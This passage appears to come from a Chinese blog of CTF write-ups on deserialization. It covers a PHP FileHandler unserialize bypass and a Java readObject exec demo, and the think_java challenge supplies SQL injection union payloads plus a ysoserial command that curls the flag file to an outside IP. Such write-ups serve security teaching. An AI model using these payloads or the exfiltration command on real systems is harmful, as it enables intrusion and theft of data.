class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$op</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$content</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$op</span> = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        <span class="variable">$filename</span> = <span class="string">&quot;/tmp/tmpfile&quot;</span>;</span><br><span class="line">        <span class="variable">$content</span> = <span class="string">&quot;Hello World!&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">process</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">process</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;op == <span class="string">&quot;1&quot;</span>) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;op == <span class="string">&quot;2&quot;</span>) &#123;</span><br><span class="line">            <span class="variable">$res</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">read</span>();</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="variable">$res</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="string">&quot;Bad Hacker!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;filename) &amp;&amp; <span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;content)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>((<span class="keyword">string</span>)<span class="variable language_">$this</span>-&gt;content) &gt; <span class="number">100</span>) &#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="string">&quot;Too long!&quot;</span>);</span><br><span class="line">                <span class="keyword">die</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$res</span> = <span class="title function_ invoke__">file_put_contents</span>(<span class="variable language_">$this</span>-&gt;filename, <span class="variable language_">$this</span>-&gt;content);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$res</span>) <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="string">&quot;Successful!&quot;</span>);</span><br><span class="line">            <span class="keyword">else</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$res</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;filename)) &#123;</span><br><span class="line">            <span class="variable">$res</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable language_">$this</span>-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$res</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">output</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;[Result]: &lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$s</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;op === <span class="string">&quot;2&quot;</span>)</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;op = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;content = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">process</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$s</span>); <span class="variable">$i</span>++)</span><br><span class="line">        <span class="keyword">if</span>(!(<span class="title function_ invoke__">ord</span>(<span class="variable">$s</span>[<span class="variable">$i</span>]) &gt;= <span class="number">32</span> &amp;&amp; <span class="title function_ invoke__">ord</span>(<span class="variable">$s</span>[<span class="variable">$i</span>]) &lt;= <span class="number">125</span>))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>&#123;<span class="string">&#x27;str&#x27;</span>&#125;)) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$str</span> = (<span class="keyword">string</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;str&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_valid</span>(<span class="variable">$str</span>)) &#123;</span><br><span class="line">        <span class="variable">$obj</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$str</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="代码审计-1"><a href="#代码审计-1" class="headerlink" title="代码审计"></a>代码审计</h3><p>首先是一道有类反序列化题</p><p>接受str参数, 执行<code>is_valid()</code>函数,执行unserialize()函数,反序列化</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>&#123;<span class="string">&#x27;str&#x27;</span>&#125;)) &#123;</span><br><span class="line">    <span class="variable">$str</span> = (<span class="keyword">string</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;str&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_valid</span>(<span class="variable">$str</span>)) &#123;</span><br><span class="line">        <span class="variable">$obj</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$str</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>is_valid()函数检查对象变量是否已经实例化,序列化则返回</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$s</span>); <span class="variable">$i</span>++)</span><br><span class="line">        <span class="keyword">if</span>(!(<span class="title function_ invoke__">ord</span>(<span class="variable">$s</span>[<span class="variable">$i</span>]) &gt;= <span class="number">32</span> &amp;&amp; <span class="title function_ invoke__">ord</span>(<span class="variable">$s</span>[<span class="variable">$i</span>]) &lt;= <span class="number">125</span>))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>进入首先先执行构造方法,定义变量,执行<code>process()</code>方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$op</span> = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">    <span class="variable">$filename</span> = <span class="string">&quot;/tmp/tmpfile&quot;</span>;</span><br><span class="line">    <span class="variable">$content</span> = <span class="string">&quot;Hello World!&quot;</span>;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">process</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跟踪process()函数,判断<code>$op</code>,使用<code>==</code>,圈起来要考!!判断是否等于”1”,成立执行<code>write()</code>函数<br>不成立往下走再判断是否等于”2”,成立执行<code>read()</code><br><code>read()</code>函数,会返回包含文件的内容,也就是flag</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$res</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;filename)) &#123;</span><br><span class="line">        <span class="variable">$res</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable language_">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$res</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上述皆不成立输出 Bad Hacker!</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">process</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">       <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;op == <span class="string">&quot;1&quot;</span>) &#123;</span><br><span class="line">           <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>();</span><br><span class="line">       &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;op == <span class="string">&quot;2&quot;</span>) &#123;</span><br><span class="line">           <span class="variable">$res</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">read</span>();</span><br><span class="line">           <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="variable">$res</span>);</span><br><span class="line">       &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">           <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="string">&quot;Bad Hacker!&quot;</span>);</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>因为一开始构造函数,赋值了$op的值等于”1”,所以跟踪<code>write()</code>,可以发现<code>write()</code>,仅执行一些输入语句就结束了,和flag无关,所有不能执行<code>write()</code>函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;filename) &amp;&amp; <span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;content)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>((<span class="keyword">string</span>)<span class="variable language_">$this</span>-&gt;content) &gt; <span class="number">100</span>) &#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="string">&quot;Too long!&quot;</span>);</span><br><span class="line">                <span class="keyword">die</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$res</span> = <span class="title function_ invoke__">file_put_contents</span>(<span class="variable language_">$this</span>-&gt;filename, <span class="variable language_">$this</span>-&gt;content);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$res</span>) <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="string">&quot;Successful!&quot;</span>);</span><br><span class="line">            <span class="keyword">else</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>代码全部完执行,对象被销毁,执行析构方法,使用<code>===</code>判断是否等于”2”,成立再赋值为”1”,否则执行process()</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;op === <span class="string">&quot;2&quot;</span>)</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;op = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;content = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">process</span>();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>所以在process()函数里,就不能执行<code>write()</code>函数,要执行<code>read()</code>函数,$op&#x3D;&#x3D;”2”就不能成立,此处判断使用<code>==</code>而不是<code>===</code><br>校验并不严格,所以我们可以使用” 2”,此处是空格2,构造序列化数据去绕过</p><h3 id="构造数据"><a href="#构造数据" class="headerlink" title="构造数据"></a>构造数据</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><p>输出</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">O</span>:<span class="number">11</span>:<span class="string">&quot;FileHandler&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">2</span>:<span class="string">&quot;op&quot;</span>;s:<span class="number">2</span>:<span class="string">&quot; 2&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;filename&quot;</span>;s:<span class="number">12</span>:<span class="string">&quot;/tmp/tmpfile&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;content&quot;</span>;s:<span class="number">12</span>:<span class="string">&quot;Hello World!&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><h3 id="payload-1"><a href="#payload-1" class="headerlink" title="payload"></a>payload</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$op</span> = <span class="string">&quot; 2&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span> = <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">FileHandler</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>输出</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">O</span>:<span class="number">11</span>:<span class="string">&quot;FileHandler&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">2</span>:<span class="string">&quot;op&quot;</span>;s:<span class="number">2</span>:<span class="string">&quot; 2&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;filename&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;flag.php&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;content&quot;</span>;N;&#125;</span><br></pre></td></tr></table></figure><p>提交数据</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">url</span>/?str=O:<span class="number">11</span>:<span class="string">&quot;FileHandler&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">2</span>:<span class="string">&quot;op&quot;</span>;s:<span class="number">2</span>:<span class="string">&quot;%202&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;filename&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;flag.php&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;content&quot;</span>;N;&#125;</span><br></pre></td></tr></table></figure><p>源代码查看flag<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202205312147133.png"></p><h1 id="JAVA反序列化"><a href="#JAVA反序列化" class="headerlink" title="JAVA反序列化"></a>JAVA反序列化</h1><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206011820673.png"></p><p>Java中通常使用Java.io.ObjectOutputStream类中的writeObject方法进行序列化<br>java.io.ObjectInputStream类中的readObject方法进行反序列化。<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206011820623.png"></p><h2 id="特征"><a href="#特征" class="headerlink" title="特征"></a>特征</h2><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206011820429.png"></p><h2 id="反序列化漏洞实验"><a href="#反序列化漏洞实验" class="headerlink" title="反序列化漏洞实验"></a>反序列化漏洞实验</h2><h3 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h3><p>将”hello”以序列化写入a.ser文件</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">writeObject</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String args[])</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="string">&quot;hello&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 将序列化后的数据写入文件a.ser中，当序列化一个对象到文件时， 按照 Java 的标准约定是给文件一个 .ser 扩展名</span></span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;a.ser&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">os</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fos);</span><br><span class="line">        os.writeObject(obj);</span><br><span class="line">        os.close();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 从文件a.ser中读取数据</span></span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;a.ser&quot;</span>);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fis);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 通过反序列化恢复字符串</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">obj2</span> <span class="operator">=</span> (String)ois.readObject();</span><br><span class="line">        System.out.println(obj2);</span><br><span class="line">        ois.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>以16进制打开a.ser<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206011835256.png"></p><p>以aced开头,Java序列化数据格式始终以双字节的十六进制0xAC ED作为开头，Base64编码之后为rO0A。</p><h3 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h3><p>将a.ser反序列化</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义一个实现 java.io.Serializable 接口的类Test</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Test</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String cmd=<span class="string">&quot;calc&quot;</span>;</span><br><span class="line">    <span class="comment">// 重写readObject()方法</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream in)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException&#123;</span><br><span class="line">        <span class="comment">// 执行默认的readObject()方法</span></span><br><span class="line">        in.defaultReadObject();</span><br><span class="line">        <span class="comment">// 执行打开计算器程序的命令</span></span><br><span class="line">        Runtime.getRuntime().exec(cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String args[])</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">// 从a.ser文件中反序列化test对象</span></span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;a.ser&quot;</span>);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fis);</span><br><span class="line">        <span class="type">Test</span> <span class="variable">objectFromDisk</span> <span class="operator">=</span> (Test)ois.readObject();</span><br><span class="line">        System.out.println(objectFromDisk.cmd);</span><br><span class="line">        ois.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="网鼎杯think-java"><a href="#网鼎杯think-java" class="headerlink" title="网鼎杯think_java"></a>网鼎杯think_java</h2><p>打开环境,下载题目附件,丢idea里</p><h3 id="代码审计-2"><a href="#代码审计-2" class="headerlink" title="代码审计"></a>代码审计</h3><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206011924879.png"></p><p>发现可疑文件名<code>sqldict</code>,跟进查看,并未对参数做过滤<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206011927102.png"></p><p>继续审计,发现存在api接口,&#x2F;swagger-ui.html<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206011930008.png"></p><h3 id="访问接口"><a href="#访问接口" class="headerlink" title="访问接口"></a>访问接口</h3><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206011942906.png"></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206011944415.png"></p><h3 id="payload-2"><a href="#payload-2" class="headerlink" title="payload"></a>payload</h3><p>代码审计出,此处存在注入,需要使用#或?闭合掉前面的语句,因为此语句也用来连接jdbc</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">myapp#<span class="string">&#x27; union/**/select/**/database()#</span></span><br><span class="line"><span class="string">myapp#&#x27;</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span>group_concat(<span class="built_in">column_name</span>)<span class="keyword">from</span>(information_schema.<span class="keyword">columns</span>)<span class="keyword">where</span>(<span class="built_in">table_name</span>=<span class="string">&#x27;user&#x27;</span>)<span class="keyword">and</span>(table_schema=<span class="string">&#x27;myapp&#x27;</span>)#</span><br><span class="line">myapp#<span class="string">&#x27;union/**/select/**/name from user#</span></span><br><span class="line"><span class="string">myapp#&#x27;</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span>pwd <span class="keyword">from</span> <span class="keyword">user</span>#</span><br></pre></td></tr></table></figure><p>查出账号密码<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206012010419.png"><br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206011959293.png"></p><p>登录获取cookie<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206012012443.png"><br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206012013818.png"><br>Base64加密过后的序列化数据</p><p>放入cookie<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206012016486.png"></p><p>这里应该就是将数据反序列化<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206012016703.png"></p><h3 id="nc反弹"><a href="#nc反弹" class="headerlink" title="nc反弹"></a>nc反弹</h3><p>使用ysoserial构造序列化数据</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial.jar ROME <span class="string">&quot;curl http://162.14.73.93:4444 -d @flag&quot;</span> |base64</span><br></pre></td></tr></table></figure><p>监听端口<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206012100951.png"></p><p>没有外网ip,内网穿透,不知道为什么试了很多次反弹不回来…</p>]]></content>
    
    
